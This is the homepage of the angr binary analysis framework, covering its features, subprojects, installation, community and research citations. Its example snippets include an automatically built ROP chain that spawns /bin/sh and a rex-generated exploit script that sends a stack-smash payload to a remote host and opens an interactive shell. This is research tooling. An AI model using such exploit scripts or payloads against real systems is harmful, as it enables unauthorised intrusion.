[ angr ][1]

* >>>
* [
  
  home
  
  ][2]
* [
  
  code
  
  ][3]
* [
  
  docs
  
  ][4]
* [
  
  blog
  
  ][5]
* [
  
  get involved!
  
  ][6]

# angr

angr is an open-source binary analysis platform for Python. It combines both static and dynamic
symbolic ("concolic") analysis, providing tools to solve a variety of tasks.

## Features

* **
  
  ### Open Source
  
  Released as Free and Open Source Software under the permissive BSD license. Contributions are
  welcome.
* **
  
  ### Cross-Platform
  
  Runs on Windows, macOS, and Linux. Built for Python 3.10+.
* **
  
  ### Symbolic Execution
  
  Provides a powerful symbolic execution engine, constraint solving, and instrumentation.
* **
  
  ### Control-Flow Graph Recovery
  
  Provides advanced analysis techniques for control-flow graph recovery.
* **
  
  ### Disassembly & Lifting
  
  Provides convenient methods to disassemble code and lift to an intermediate language.
* *`{}`*
  
  ### Decompilation
  
  Decompile machine code to angr Intermediate Language (AIL) and C pseudocode.
* **
  
  ### Architecture Support
  
  Supports analysis of several CPU architectures, loading from several executable formats.
* **
  
  ### Extensibility
  
  Provides powerful extensibility for analyses, architectures, platforms, exploration techniques,
  hooks, and more.

## Applications

As an introduction to angr's capabilities, here are some of the things that you can do using angr
and the tools built with it:

* Control-flow graph recovery.
  show code
  hide code
  `>>> import angr
  >>> proj = angr.Project('./fauxware')
  >>> cfg = proj.analyses.CFG()
  >>> dict(proj.kb.functions)
  {4195552L: <Function _init (0x4004e0)>,
   4195600L: <Function plt.puts (0x400510)>,
   4195616L: <Function plt.printf (0x400520)>,
   4195632L: <Function plt.read (0x400530)>,
   4195648L: <Function plt.__libc_start_main (0x400540)>,
   4195664L: <Function plt.strcmp (0x400550)>,
   4195680L: <Function plt.open (0x400560)>,
   4195696L: <Function plt.exit (0x400570)>,
   4195712L: <Function _start (0x400580)>,
   4195756L: <Function call_gmon_start (0x4005ac)>,
   4195904L: <Function frame_dummy (0x400640)>,
   4195940L: <Function authenticate (0x400664)>,
   4196077L: <Function accepted (0x4006ed)>,
   4196093L: <Function rejected (0x4006fd)>,
   4196125L: <Function main (0x40071d)>,
   4196320L: <Function __libc_csu_init (0x4007e0)>,
   4196480L: <Function __do_global_ctors_aux (0x400880)>}
  `
* Symbolic execution.
  show code
  hide code
  `>>> import os
  >>> import angr
  >>> project = angr.Project("defcamp_quals_2015_r100", auto_load_libs=False)
  >>> simgr = project.factory.simgr()
  >>> simgr.explore(find=lambda path: 'Nice!' in path.state.posix.dumps(1))
  >>> print(simgr.found[0].state.posix.dumps(0))
  Code_Talkers
  `
  `$ ./defcamp_quals_2015_r100
  Enter the password: Code_Talkers
  Nice!
  `
* Automatic ROP chain building using [angrop][7].
  show code
  hide code
  `>>> import angr
  >>> import angrop
  >>> project = angr.Project("/bin/bash", auto_load_libs=False)
  >>> rop = project.analyses.ROP()
  >>> rop.find_gadgets()
  >>> rop.execve("/bin/sh").print_payload_code()
  chain = ""
  chain += p64(0x4929bc)  # pop rax; ret
  chain += p64(0x702fb8)
  chain += p64(0x420b5c)  # pop rsi; ret
  chain += p64(0x68732f6e69622f)
  chain += p64(0x4a382a)  # mov qword ptr [rax + 8], rsi; xor eax, eax; ret
  chain += p64(0x4929bc)  # pop rax; ret
  chain += p64(0x3b)
  chain += p64(0x41e844)  # pop rdi; ret
  chain += p64(0x702fc0)
  chain += p64(0x4ed076)  # pop rdx; ret
  chain += p64(0x0)
  chain += p64(0x420b5c)  # pop rsi; ret
  chain += p64(0x0)
  chain += p64(0x401b94)
  chain += p64(0x0)
  chain += p64(0x0)
  chain += p64(0x0)
  chain += p64(0x0)
  chain += p64(0x0)
  chain += p64(0x0)
  chain += p64(0x0)
  `
* Automatic binary hardening using [patcherex][8].
  show code
  hide code
  `$ patcherex/patch_master.py single test_binaries/CADET_00003 stackretencryption CAD ET_00003_stac
  kretencryption
  `
* Automatic exploit generation (for DECREE and simple Linux binaries) using [rex][9].
  show code
  hide code
  `>>> import rex
  >>> rex.Crash("vuln_stacksmash", "A"*227).exploit().arsenal["rop_to_system"].script("x.py")
  
  $ cat x.py
  import sys
  import time
  from pwn import *
  
  if len(sys.argv) < 3:
      print "%s:  " % sys.argv[0]
      sys.exit(1)
  
  r = remote(sys.argv[1], int(sys.argv[2]))
  r.send('\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
  00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
  \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
  00\xde\x82\x04\x08\x10\x83\x04\x08\xf2\x82\x04\x08\x00\x00\x00\x00\x1f\xa0\x04\x08\x08\x00\x00\x00
  \xde\x82\x04\x08\x83\x04\x08\xf5\x82\x04\x08\x1f\xa0\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
  00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
  \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
  00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
  \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
  00\x00\x00\x00\x00\x00\x00\x00')
  time.sleep(.1)
  r.send('/bin/sh\x00')
  r.interactive()
  `
* Use [angr-management][10], a (very alpha state!) GUI for angr, to analyze binaries!
  show code
  hide code
  `angr-management/run-docker.sh
  `
* Achieve cyber-autonomy in the comfort of your own home, using [Mechanical Phish][11], the
  third-place winner of the DARPA Cyber Grand Challenge.

angr itself is made up of several subprojects, all of which can be used separately in other
projects:

* an executable and library loader, [CLE][12]
* a library describing various architectures, [archinfo][13]
* a Python wrapper around the binary code lifter VEX, [PyVEX][14]
* a data backend to abstract away differences between static and symbolic domains, [Claripy][15]
* the program analysis suite itself, [angr][16]

## Installation

angr is installed as a Python 3.10+ package, and can be easily installed via PIP.

`pip install angr
`

## Documentation

There are a few resources you can use to help you get up to speed!

* Documentation, walk-throughs, and examples are available at [docs.angr.io][17].
* The [API reference][18].
* Check out [the blog][19]! We're slowly adding many useful examples, tutorials, and walkthroughs
  there.
* The presentations from angr's debut at [DEFCON 23][20] [(video)][21] and [Blackhat 2015][22]
  [(video)][23]
* Presentations discussing Shellphish's use of angr in the DARPA Cyber Grand Challenge at [HITCON
  ENT 2015][24], [HITCON CMT 2015][25], and [32C3][26] [(video)][27]

## Community

There are a few resources you can use to help you get up to speed or get you contributing to the
project!

* Chat with us on the [angr Discord server][28].
* You can file an issue or send us a PR on [github][29] in the appropriate repo.
* If you prefer email, and don't mind longer response times, shoot an email to
  angr-at-lists.cs.ucsb.edu. This is a public mailing list (to which you can subscribe [here][30]).

In all this, please keep in mind that angr is a large project being frantically worked on by a very
small group of overworked students. It's open source, with a typical open source support model
(i.e., pray for the best).

For an idea of *what* to help with, check [this][31] out.

## Citation

We have used angr heavily in our academic research! If you have used angr or its sub-components in
your research, please cite at least the following paper describing it:

@inproceedings{shoshitaishvili2016state,
  title={{SoK: (State of) The Art of War: Offensive Techniques in Binary Analysis}},
  author={Shoshitaishvili, Yan and Wang, Ruoyu and Salls, Christopher and
          Stephens, Nick and Polino, Mario and Dutcher, Audrey and Grosen, John and
          Feng, Siji and Hauser, Christophe and Kruegel, Christopher and Vigna, Giovanni},
  booktitle={IEEE Symposium on Security and Privacy},
  year={2016}
}
Show more papers
Show fewer papers

Additionally, the angr authors and their collaborators have used angr in the following publications:

@inproceedings{gritti2020symbion,
 author = {Gritti, Fabio and Fontana, Lorenzo and Gustafson, Eric and Pagani, Fabio and Continella, 
Andrea and Kruegel, Christopher and Vigna, Giovanni},
 booktitle = {Proceedings of the IEEE Conference on Communications and Network Security (CNS)},
 month = {June},
 title = {SYMBION: Interleaving Symbolic with Concrete Execution},
 year = {2020}
}

@inproceedings{bao2017your,
  title={{Your Exploit is Mine: Automatic Shellcode Transplant for Remote Exploits}},
  author={Bao, Tiffany and Wang, Ruoyu and Shoshitaishvili, Yan and Brumley, David},
  booktitle={IEEE Symposium on Security and Privacy},
  year={2017}
}

@inproceedings{machiry2017boomerang,
  title={{BOOMERANG: Exploiting the Semantic Gap in Trusted Execution Environments}},
  author={Machiry, Aravind and Gustafson, Eric and Spensky, Chad and Salls, Christopher
          and Stephens, Nick and Wang, Ruoyu and Bianchi, Antonio and Choe, Yung Ryn and
          Kruegel, Christopher and Vigna, Giovanni},
  booktitle={Proceedings of the 2017 Network and Distributed System Security Symposium},
  year={2017}
}

@inproceedings{wang2017ramblr,
  title={{Ramblr: Making Reassembly Great Again}},
  author={Wang, Ruoyu and Shoshitaishvili, Yan and Bianchi, Antonio and Aravind, Machiry
          and Grosen, John and Grosen, Paul and Kruegel, Christopher and Vigna, Giovanni},
  booktitle={Proceedings of the 2017 Network and Distributed System Security Symposium},
  year={2017}
}

@misc{shellphish-phrack,
  title={Cyber Grand Shellphish},
  author={Shellphish},
  note={\url{http://phrack.org/papers/cyber_grand_shellphish.html}},
  year={2017},
}

@inproceedings{stephens2016driller,
  title={{Driller: Augmenting Fuzzing Through Selective Symbolic Execution}},
  author={Stephens, Nick and Grosen, John and Salls, Christopher and Dutcher, Audrey and
          Wang, Ruoyu and Corbetta, Jacopo and Shoshitaishvili, Yan and
          Kruegel, Christopher and Vigna, Giovanni},
  booktitle={Proceedings of the 2016 Network and Distributed System Security Symposium},
  year={2016}
}

@inproceedings{shoshitaishvili2015firmalice,
  title={{Firmalice - Automatic Detection of Authentication Bypass Vulnerabilities
         in Binary Firmware}},
  author={Shoshitaishvili, Yan and Wang, Ruoyu and Hauser, Christophe and
          Kruegel, Christopher and Vigna, Giovanni},
  booktitle={Proceedings of the 2015 Network and Distributed System Security Symposium},
  year={2015}
}

Finally, angr (or its subcomponents) have been used in many other academic works:

@article{parvez2016combining,
  title={{Combining Static Analysis and Targeted Symbolic Execution for Scalable
         Bug-finding in Application Binaries}},
  author={Parvez, Muhammad Riyad},
  year={2016},
  publisher={University of Waterloo}
}

@inproceedings{pewny2015cross,
  title={{Cross-Architecture Bug Search in Binary Executables}},
  author={Pewny, Jannik and Garmany, Behrad and Gawlik, Robert and Rossow, Christian
          and Holz, Thorsten},
  booktitle={Security and Privacy (SP), 2015 IEEE Symposium on},
  pages={709--724},
  year={2015},
  organization={IEEE}
}

@inproceedings{vogl2014dynamic,
  title={{Dynamic hooks: hiding control flow changes within non-control data}},
  author={Vogl, Sebastian and Gawlik, Robert and Garmany, Behrad and Kittel, Thomas
          and Pfoh, Jonas and Eckert, Claudia and Holz, Thorsten},
  booktitle={23rd USENIX Security Symposium (USENIX Security 14)},
  pages={813--328},
  year={2014}
}

Semi-academically, angr was one of the underpinnings of Shellphish's Cyber Reasoning System for the
DARPA Cyber Grand Challenge, enabling them to win third place in the final round (more info
[here][32])! Shellphish has also used angr in many CTFs.

## Who works on angr?

angr is worked on by several researchers in [the Computer Security Lab at UC Santa Barbara][33] and
[SEFCOM at Arizona State University][34]. Core developers (arbitrarily, 1000+ lines of code!)
include:

* Yan Shoshitaishvili
* Ruoyu (Fish) Wang
* Audrey Dutcher
* Lukas Dresel
* Zion Leonahenahe Basque
* Eric Gustafson
* Nilo Redini
* Paul Grosen
* Colin Unger
* Chris Salls
* Nick Stephens
* Christophe Hauser
* Jessie Grosen

angr would never have happened if it were not for the vision, wisdom, guidance, and support of the
professors:

* Christopher Kruegel
* Giovanni Vigna

Additionally, there are *many* open-source contributors, which you can see at [the][35]
[various][36] [repositories][37] [in][38] [the][39] [github][40] [orgs][41].


angr owes its existence to research sponsored by DARPA under agreement number
[N66001-13-2-4039][42]!

Site icons provided by [Icomoon][43] and [Freepik][44], licensed by [CC 3.0 BY][45]

For questions, hop on [our slack][46] (get an invite [here][47]) or contact the angr mailing list:
[angr ~at~ lists.cs.ucsb.edu][48]

[1]: /
[2]: /
[3]: https://github.com/angr
[4]: https://docs.angr.io/
[5]: /blog
[6]: /#contact
[7]: http://github.com/salls/angrop
[8]: http://github.com/angr/patcherex
[9]: http://github.com/shellphish/rex
[10]: https://github.com/angr/angr-management
[11]: http://shellphish.net/cgc/#tools
[12]: https://github.com/angr/cle
[13]: https://github.com/angr/archinfo
[14]: https://github.com/angr/pyvex
[15]: https://github.com/angr/claripy
[16]: https://github.com/angr/angr
[17]: https://docs.angr.io
[18]: https://api.angr.io
[19]: /blog
[20]: https://docs.google.com/presentation/d/1t7KaCMc73z7WdV7EcL0z9TSHlT_kjdMdSrPHtpA6ezc/edit#slide
=id.p
[21]: https://www.youtube.com/watch?v=oznsT-ptAbk
[22]: https://docs.google.com/presentation/d/1kwObiKZsPSpxM0uZByzeRTaLC7RS1E2C7UR6HxD7Y1Y/edit#slide
=id.p4
[23]: https://youtu.be/Fi_S2F7ud_g
[24]: http://cs.ucsb.edu/~antoniob/files/hitcon_2015_public.pdf
[25]: https://docs.google.com/presentation/d/1ko1a28XL1nOm6LfqW5fCk6qjFmnhGIATyGDlAnxNcaA/edit#slide
=id.p
[26]: https://www.youtube.com/watch?v=l4kmWhYija0
[27]: https://www.youtube.com/watch?v=XGhg19_GXnM
[28]: http://discord.angr.io
[29]: https://github.com/angr
[30]: https://lists.cs.ucsb.edu/mailman/listinfo/angr
[31]: https://docs.angr.io/introductory-errata/helpwanted
[32]: http://shellphish.net/cgc
[33]: http://seclab.cs.ucsb.edu
[34]: http://sefcom.asu.edu
[35]: https://github.com/angr/angr/graphs/contributors
[36]: https://github.com/angr/claripy/graphs/contributors
[37]: https://github.com/angr/cle/graphs/contributors
[38]: https://github.com/angr/pyvex/graphs/contributors
[39]: https://github.com/angr/archinfo/graphs/contributors
[40]: https://github.com/angr/patcherex/graphs/contributors
[41]: https://github.com/shellphish/rex/graphs/contributors
[42]: http://www.darpa.mil/program/vetting-commodity-it-software-and-firmware
[43]: https://www.flaticon.com/authors/icomoon
[44]: http://www.freepik.com
[45]: http://creativecommons.org/licenses/by/3.0/
[46]: http://angr.slack.com
[47]: /invite
[48]: mailto:%61%6e%67%72@%6c%69%73%74%73.%63%73.%75%63%73%62.%65%64%75
